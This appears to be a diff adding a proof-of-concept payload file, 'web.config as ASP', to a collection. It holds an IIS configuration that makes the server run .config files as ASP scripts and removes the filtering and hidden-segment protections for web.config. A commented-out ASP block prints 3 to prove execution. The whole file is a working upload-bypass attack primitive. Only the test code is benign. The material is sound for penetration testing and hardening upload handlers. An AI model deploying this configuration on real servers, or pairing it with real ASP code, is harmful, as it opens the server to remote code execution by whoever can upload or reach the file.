@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>web.config as ASP</title>
+</head><body>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>
+&lt;configuration&gt;<br/>
+&nbsp; &nbsp;&lt;system.webServer&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;handlers accessPolicy="Read, Script, Write"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &lt;/handlers&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;security&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;requestFiltering&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;fileExtensions&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;remove fileExtension=".config" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;/fileExtensions&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;hiddenSegments&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;remove segment="web.config" /&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;/hiddenSegments&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;/requestFiltering&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;/security&gt;<br/>
+&nbsp; &nbsp;&lt;/system.webServer&gt;<br/>
+&lt;/configuration&gt;<br/>
+&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!<br/>
+&lt;%<br/>
+Response.write("-"&amp;"-&gt;")<br/>
+' it is running the ASP code if you can see 3 by opening the web.config file!<br/>
+Response.write(1+2)<br/>
+Response.write("&lt;!-"&amp;"-")<br/>
+%&gt;<br/>
+--&gt;</body></html>
